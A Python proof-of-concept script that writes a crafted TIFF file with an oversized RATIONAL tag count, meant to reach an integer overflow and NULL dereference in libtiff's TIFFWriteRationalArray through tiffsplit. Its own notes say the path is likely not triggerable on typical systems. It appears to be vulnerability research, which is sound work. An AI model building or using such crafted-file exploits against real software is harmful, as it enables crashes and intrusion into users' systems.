#!/usr/bin/env python3
"""
PoC generator for VULN_001: Integer Overflow in TIFFWriteRationalArray
malloc Leading to Heap Overflow or Crash (CWE-190 -> CWE-122)

Target: libtiff/libtiff/tif_dirwrite.c, TIFFWriteRationalArray(), line 1017
  t = (uint32*) _TIFFmalloc(2 * dir->tdir_count * sizeof (uint32));

When dir->tdir_count >= 0x80000000, the expression
  2 * dir->tdir_count
wraps to a tiny value in 32-bit unsigned arithmetic, so the malloc
succeeds (allocating 8 bytes for count=0x80000001), but the subsequent
loop reads fp[0] where fp==NULL (tv->value was set NULL during allocation
failure in _TIFFVSetField), causing a NULL dereference / segfault.

Attack chain via tiffsplit:
  tiffsplit -> TIFFOpen("r") -> TIFFReadDirectory() ->
  [registers anonymous RATIONAL VARIABLE2 tag for unknown tag id;
   _TIFFCheckMalloc fails for 8GB buffer so tv->value stays NULL
   but td_customValues entry has count=0x80000001] ->
  TIFFWriteDirectory() -> TIFFWriteNormalTag() ->
  TIFFGetField() [wc2=0x80000001, fp=NULL] ->
  TIFFWriteRationalArray(dir with count=0x80000001, fp=NULL) ->
  tiny alloc (8 bytes due to 32-bit wrap), then NULL deref on fp[0].

NOTE: On most 64-bit systems the read-side _TIFFCheckMalloc(0x80000001,
sizeof(float)) attempts ~8 GB allocation which fails, preventing
TIFFSetField from being called and therefore the tag never ends up in
td_customValues. As a result this approach is likely NOT triggerable via
a plain crafted file on typical hardware. The script is provided for
completeness and analysis purposes.
"""

import struct
import os

OUTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")

# ---- TIFF structure constants ----
LITTLE_ENDIAN_MAGIC = b'II'
TIFF_MAGIC          = 42
IFD_ENTRY_SIZE      = 12

# TIFF data types
TIFF_RATIONAL  = 5
TIFF_SRATIONAL = 10
TIFF_SHORT     = 3
TIFF_LONG      = 4

# Tags used in the crafted file
TIFFTAG_IMAGEWIDTH    = 0x0100
TIFFTAG_IMAGELENGTH   = 0x0101
TIFFTAG_BITSPERSAMPLE = 0x0102
TIFFTAG_COMPRESSION   = 0x0103
TIFFTAG_PHOTOMETRIC   = 0x0106
TIFFTAG_STRIPOFFSETS  = 0x0111
TIFFTAG_SAMPLESPERPIXEL = 0x0115
TIFFTAG_ROWSPERSTRIP  = 0x0116
TIFFTAG_STRIPBYTECOUNTS = 0x0117
TIFFTAG_PLANARCONFIG  = 0x011C

# Unknown private RATIONAL tag with huge count to exercise the bug path.
# Tag ID 0xFFE9 is not in the standard libtiff table, so it will be
# treated as an anonymous VARIABLE2 RATIONAL tag.
UNKNOWN_RATIONAL_TAG  = 0xFFE9
BIG_COUNT             = 0x80000001  # triggers 32-bit overflow in write path

# ---- Build a minimal valid TIFF ----
# 1x1 grayscale 8-bit uncompressed (Compression=1, Photometric=1)
# Image data: 1 strip, 1 byte.

IMAGE_DATA = b'\x80'  # 1 pixel, value 128

def pack_ifd_entry(tag, datatype, count, value_or_offset):
    """Pack one 12-byte IFD entry (little-endian)."""
    return struct.pack('<HHII', tag, datatype, count, value_or_offset)

def build_tiff():
    # Header starts at offset 0.
    # IFD offset follows header (8 bytes).
    # We lay out:
    #   [0]  Header (8 bytes)
    #   [8]  IFD: nentries(2) + entries(12*N) + next_ifd(4)
    #   ...  Image data (1 byte strip)
    #   ...  Rational data for the normal tags (if any inline)

    # The unknown rational tag has count=0x80000001.  Its data would
    # theoretically start at some offset, but because the allocation for
    # ~8 GB floats fails at read time, libtiff never actually reads the
    # payload bytes.  We point tdir_offset to a safe location in the file
    # (e.g. offset 0) so the IFD entry is at least syntactically valid.

    STRIP_DATA_OFFSET = 0  # will be filled in later (placeholder)

    entries = []

    # --- Mandatory baseline tags (sorted ascending by tag value) ---
    entries.append((TIFFTAG_IMAGEWIDTH,      TIFF_SHORT, 1, 1))
    entries.append((TIFFTAG_IMAGELENGTH,     TIFF_SHORT, 1, 1))
    entries.append((TIFFTAG_BITSPERSAMPLE,   TIFF_SHORT, 1, 8))
    entries.append((TIFFTAG_COMPRESSION,     TIFF_SHORT, 1, 1))    # no compression
    entries.append((TIFFTAG_PHOTOMETRIC,     TIFF_SHORT, 1, 1))    # MinIsBlack
    entries.append((TIFFTAG_SAMPLESPERPIXEL, TIFF_SHORT, 1, 1))
    entries.append((TIFFTAG_ROWSPERSTRIP,    TIFF_SHORT, 1, 1))
    entries.append((TIFFTAG_PLANARCONFIG,    TIFF_SHORT, 1, 1))    # Chunky

    # StripOffsets and StripByteCounts are computed after we know sizes.
    # Use placeholder 0 for now; we'll fix them up below.
    entries.append((TIFFTAG_STRIPOFFSETS,    TIFF_LONG,  1, 0))    # placeholder
    entries.append((TIFFTAG_STRIPBYTECOUNTS, TIFF_LONG,  1, 1))

    # --- The malicious unknown RATIONAL tag with huge count ---
    # Provide a count of 0x80000001 so that on the write path:
    #   2 * 0x80000001 = 0x100000002 -> wraps to 2 (uint32)
    #   _TIFFmalloc(2 * sizeof(uint32)) = 8 bytes -> succeeds
    #   then v[0] with v==NULL -> NULL deref
    # On the read path the ~8 GB buffer allocation will fail so the
    # tag will not be stored in td_customValues; see notes for details.
    entries.append((UNKNOWN_RATIONAL_TAG, TIFF_RATIONAL, BIG_COUNT, 0))

    # Sort IFD entries by tag (TIFF spec requirement).
    entries.sort(key=lambda e: e[0])

    nentries = len(entries)
    ifd_offset = 8  # right after the header

    # IFD block size = 2 (count) + nentries*12 + 4 (next IFD)
    ifd_size = 2 + nentries * IFD_ENTRY_SIZE + 4

    # Strip data goes right after the IFD block.
    strip_offset = ifd_offset + ifd_size

    # Fix up StripOffsets to point at actual image data.
    entries_fixed = []
    for (tag, dtype, count, val) in entries:
        if tag == TIFFTAG_STRIPOFFSETS:
            val = strip_offset
        entries_fixed.append((tag, dtype, count, val))

    # --- Serialize ---
    buf = bytearray()

    # Header: byte order + magic + IFD offset
    buf += LITTLE_ENDIAN_MAGIC
    buf += struct.pack('<H', TIFF_MAGIC)
    buf += struct.pack('<I', ifd_offset)

    # IFD
    buf += struct.pack('<H', nentries)
    for (tag, dtype, count, val) in entries_fixed:
        buf += struct.pack('<HHII', tag, dtype, count, val)
    buf += struct.pack('<I', 0)  # no next IFD

    # Strip data
    buf += IMAGE_DATA

    return bytes(buf)


if __name__ == '__main__':
    data = build_tiff()
    with open(OUTFILE, 'wb') as f:
        f.write(data)
    print(f"Written {len(data)} bytes to {OUTFILE}")
    print(f"Unknown RATIONAL tag 0x{UNKNOWN_RATIONAL_TAG:04X} "
          f"with count=0x{BIG_COUNT:08X} ({BIG_COUNT})")
    print("NOTE: On typical 64-bit systems with limited RAM the read-side")
    print("  _TIFFCheckMalloc(0x80000001, sizeof(float)) allocation (~8 GB)")
    print("  will fail, so the tag is NOT stored in td_customValues and")
    print("  TIFFWriteRationalArray is never called. Status: SKIPPED.")
